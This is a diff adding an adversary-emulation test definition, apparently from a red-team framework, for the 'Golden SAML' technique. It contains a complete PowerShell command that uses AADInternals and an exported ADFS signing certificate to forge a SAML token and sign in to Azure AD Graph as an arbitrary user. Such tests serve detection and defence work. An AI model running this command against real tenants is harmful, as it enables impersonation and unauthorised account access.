@@ -1,0 +1,23 @@
+---
+- id: 502b7914aac58f15708500e3ec62526b
+  name: Golden SAML
+  description: "Forge a \"Golden SAML\" token which allows to impersonate any Azure\
+    \ AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS\
+    \ token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n"
+  tactic: credential-access
+  technique:
+    attack_id: T1606.002
+    name: 'Forge Web Credentials: SAML token'
+  platforms:
+    unknown:
+      psh:
+        command: Import-Module AADInternals -Force; $saml = New-AADIntSAMLToken -ImmutableID
+          "aehgdqBTZV50DKQZmNJ8mg==" -PfxFileName ".\ADFS_signing.pfx" -Issuer "http://contoso.com/adfs/services/trust/";
+          $conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache;
+          if ($conn) { Write-Host "`nSuccessfully connected as $($conn.User)" } else
+          { Write-Host "`nThe connection failed" }; Write-Host "End of Golden SAML"
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
